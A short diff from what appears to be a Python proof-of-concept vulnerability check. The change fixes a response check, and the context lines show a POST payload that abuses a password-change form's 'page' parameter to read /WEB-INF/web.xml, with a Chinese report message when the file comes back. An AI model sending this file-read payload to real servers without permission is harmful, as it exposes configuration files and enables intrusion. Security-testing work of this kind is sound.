@@ -57,7 +57,7 @@ class Poc(ABPoc):
                 Username=null&oldpassword=123&newpassword=123&PwdConfirm=123&Submit=+%C8%B7+%EF%BF%BD%EF%BF%BD+&page=%2FWEB-INF%2Fweb.xml
             '''
             response = requests.post(vul_url, data=data, headers=headers)
-            if response.status_code == 200 and 'xml version' in response.content:
+            if response.status_code == 200 and 'xml version' in response.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
